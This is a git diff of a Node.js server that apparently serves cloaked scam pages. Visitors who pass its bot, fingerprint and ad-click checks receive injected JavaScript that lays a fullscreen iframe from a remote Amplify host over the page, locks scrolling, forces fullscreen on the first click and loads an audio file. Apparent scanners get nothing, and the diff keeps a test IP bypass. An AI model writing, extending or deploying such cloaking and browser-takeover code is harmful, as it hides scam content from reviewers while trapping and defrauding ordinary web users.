@@ -13,8 +13,7 @@ const http = require("http");
 const url = require("url");
 const crypto = require("crypto");
 const Redis = require("ioredis");
-const fs = require("fs");
-const path = require("path");
+
 
 const PORT = process.env.PORT || 3000;
 
@@ -196,28 +195,8 @@ async function checkIPRate(ip) {
 // as the secondary payload for visitors from that origin.
 // Add/remove entries here to onboard new sites.
 const ORIGIN_CONFIG = {
-  "https://voltex.d1fjitss1rt3cn.amplifyapp.com": {
-    html: "sallu1.html",
-    audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
-  },
-  "https://staging.d3fyhxnjoyedxu.amplifyapp.com": {
-    html: "sallu1.html",
-    audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
-  },
-  "https://kotonohaschooljp.d28gh8vatsn4mi.amplifyapp.com": {
-    html: "dmc1.html",
-    audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
-  },
-  "https://fitnessmojo.d1m7z5vtjg6mef.amplifyapp.com": {
-    html: "dmc2.html",
-    audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
-  },
-  "https://staging.d3fyhxnjoyedxu.amplifyapp.com": {
-    html: "sallu2.html",
-    audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
-  },
   "https://main.d1h7sjnb52yxnb.amplifyapp.com": {
-    html: "rocky1.html",
+    srcUrl: "https://core.d3gjoob4nilmyf.amplifyapp.com",
     audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
   },
 };
@@ -278,25 +257,6 @@ function checkOrigin(req) {
 //  SECONDARY CODE — returned only to verified humans
 // ═══════════════════════════════════════════════════════════════
 
-// Pre-load every HTML file referenced in ORIGIN_CONFIG.
-// htmlCache maps filename → file contents (string).
-const htmlCache = {};
-const uniqueFiles = [
-  ...new Set(Object.values(ORIGIN_CONFIG).map((c) => c.html)),
-];
-for (const filename of uniqueFiles) {
-  try {
-    htmlCache[filename] = fs.readFileSync(
-      path.join(__dirname, filename),
-      "utf8",
-    );
-    console.log(`✅ Loaded ${filename} into memory`);
-  } catch (err) {
-    console.error(`❌ Failed to load ${filename}:`, err.message);
-    htmlCache[filename] = ""; // serve empty rather than crash
-  }
-}
-
 /**
  * Builds the secondary JS payload for a given origin.
  * Returns an empty string if the origin has no mapping.
@@ -307,22 +267,17 @@ function buildSecondaryJS(origin) {
     ([o]) => o.replace(/\/+$/, "").toLowerCase() === normalised,
   )?.[1];
 
-  const html = config ? (htmlCache[config.html] ?? "") : "";
+  const srcUrl = config?.srcUrl ?? "";
   const audio1Url = config?.audio1 ?? "";
 
   return `
   console.log("%c✅ Human verified. Waiting for user interaction...", "color:#0f0;font-size:18px;font-weight:bold");
 
-  const embeddedHtml = ${JSON.stringify(html)};
-
   document.documentElement.style.overflow = 'hidden';
-  document.body.insertAdjacentHTML('afterbegin', '<div id="bruceDiv" style="position:fixed;top:0;left:0;width:100%;z-index:999999;pointer-events:auto;overflow:hidden;"></div>');
+  document.body.insertAdjacentHTML('afterbegin', '<div id="bruceDiv" style="position:fixed;top:0;left:0;width:100%;z-index:9999;pointer-events:auto;overflow:hidden;"></div>');
 
-  // Load embedded HTML into an iframe via Blob URL
-    var blob = new Blob([embeddedHtml], { type: 'text/html' });
-    var blobUrl = URL.createObjectURL(blob);
-    var iframe = document.createElement('iframe');
-    iframe.src = blobUrl;
+  var iframe = document.createElement('iframe');
+    iframe.src = ${JSON.stringify(srcUrl)};
     iframe.style.width = '100%';
     iframe.style.height = '100%';
     iframe.frameBorder = '0';
@@ -333,7 +288,7 @@ function buildSecondaryJS(origin) {
     var bruceDiv = document.getElementById('bruceDiv');
     bruceDiv.appendChild(iframe);
     bruceDiv.style.height = '100vh';
-    
+
   document.addEventListener('click', function initGame() {
     // Request fullscreen with all vendor prefixes
     setTimeout(function() {
@@ -1152,12 +1107,15 @@ const server = http.createServer(async (req, res) => {
 
         // ── TEST BYPASS: skip all checks for the test IP ──────
         if (clientIP === TEST_BYPASS_IP) {
-          console.log(`  🔓 TEST BYPASS — IP ${clientIP} matches test IP, skipping all checks`);
+          console.log(
+            `  🔓 TEST BYPASS — IP ${clientIP} matches test IP, skipping all checks`,
+          );
           if (gclid) await recordVerifiedVisit(gclid, clientIP);
           // Use the request origin if it maps to a config, otherwise fall back to the first configured origin
-          const bypassOrigin = originCheck.origin && buildSecondaryJS(originCheck.origin)
-            ? originCheck.origin
-            : ALLOWED_ORIGINS[0];
+          const bypassOrigin =
+            originCheck.origin && buildSecondaryJS(originCheck.origin)
+              ? originCheck.origin
+              : ALLOWED_ORIGINS[0];
           console.log("══════════════════════════════════════════════\n");
           res.writeHead(200, { "Content-Type": "application/json" });
           return res.end(
@@ -1220,18 +1178,17 @@ const server = http.createServer(async (req, res) => {
           console.log(`  IP country: ${ipResult.countryCode}`);
         }
 
-
-          // if (!ipResult.pass) {
-          //   console.log(`  ❌ REJECTED at IP level — ${ipResult.reason}`);
-          //   console.log("══════════════════════════════════════════════\n");
-          //   res.writeHead(403, { "Content-Type": "application/json" });
-          //   return res.end(
-          //     JSON.stringify({
-          //       verified: false,
-          //       reason: `IP rejected: ${ipResult.reason}`,
-          //     }),
-          //   );
-          // }
+        // if (!ipResult.pass) {
+        //   console.log(`  ❌ REJECTED at IP level — ${ipResult.reason}`);
+        //   console.log("══════════════════════════════════════════════\n");
+        //   res.writeHead(403, { "Content-Type": "application/json" });
+        //   return res.end(
+        //     JSON.stringify({
+        //       verified: false,
+        //       reason: `IP rejected: ${ipResult.reason}`,
+        //     }),
+        //   );
+        // }
 
         // ── 4. Fingerprint verification ───────────────────────
         const result = verify(fingerprint, clientIP);
